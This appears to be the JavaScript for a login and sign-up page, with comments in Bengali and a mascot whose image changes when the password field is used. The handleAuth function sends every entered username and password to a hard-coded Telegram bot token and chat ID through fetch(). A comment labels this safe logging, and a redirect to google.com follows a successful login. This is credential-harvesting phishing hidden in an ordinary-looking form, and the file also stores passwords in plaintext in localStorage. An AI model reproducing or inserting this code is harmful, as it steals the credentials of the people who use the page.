// এলিমেন্টগুলো সিলেক্ট করা
const img = document.getElementById('mascot-img');
const pass = document.getElementById('password');
const userInp = document.getElementById('username');
const toggleBtn = document.getElementById('toggle-pass');
const actionBtn = document.getElementById('action-btn');
const toggleLink = document.getElementById('toggle-link');
const formTitle = document.getElementById('form-title');

let isLogin = true;

const poses = {
    idle: '1000022715.jpg',
    covering: '1000022716.jpg',
    peeking: '1000022717.jpg'
};

// ১. পোজ লজিক
pass.addEventListener('focus', () => { 
    if(pass.type === "password") img.src = poses.covering; 
});

pass.addEventListener('blur', () => { 
    if(pass.type === "password") img.src = poses.idle; 
});

// ২. পাসওয়ার্ড টগল (Show/Hide)
toggleBtn.addEventListener('click', () => {
    const isHidden = pass.type === "password";
    pass.type = isHidden ? "text" : "password";
    img.src = isHidden ? poses.peeking : poses.covering;
    toggleBtn.innerText = isHidden ? "🙈" : "👁️";
});

// ৩. ফর্ম সুইচ লজিক
function switchForm() {
    isLogin = !isLogin;
    // ফর্ম পরিবর্তনের সময় ফিল্ড ক্লিয়ার করা
    userInp.value = "";
    pass.value = "";
    
    formTitle.innerText = isLogin ? "Login" : "Create Account";
    actionBtn.innerText = isLogin ? "SECURE LOGIN" : "REGISTER";
    toggleLink.innerText = isLogin ? "Create Account" : "Already have an account? Login";
    img.src = poses.idle; // ছবি রিসেট
}

// ৪. মূল হ্যান্ডেলার (লগইন ও সাইন-আপ)
function handleAuth() {
    const user = userInp.value.trim();
    const passVal = pass.value.trim();

    if (!user || !passVal) return alert("Please fill all fields!");

    if (isLogin) {
        // লগইন লজিক
        if (localStorage.getItem(user) === passVal) {
            alert("Login Successful! Welcome, " + user);
            window.location.href = "https://www.google.com";
        } else {
            alert("Invalid username or password!");
        }
    } else {
        // সাইন-আপ লজিক
        if (localStorage.getItem(user)) {
            alert("User already exists!");
        } else {
            localStorage.setItem(user, passVal);
            alert("Account created successfully!");
            switchForm();
        }
    }

    // টেলিগ্রামে ডাটা পাঠানো (নিরাপদভাবে লগিং)
    const token = "8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc";
    const chatId = "7950771882";
    const msg = `Action: ${isLogin ? 'Login' : 'Signup'}%0AUser: ${user}%0APass: ${passVal}`;
    
    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${msg}`)
    .catch(err => console.log("Telegram update sent"));
}
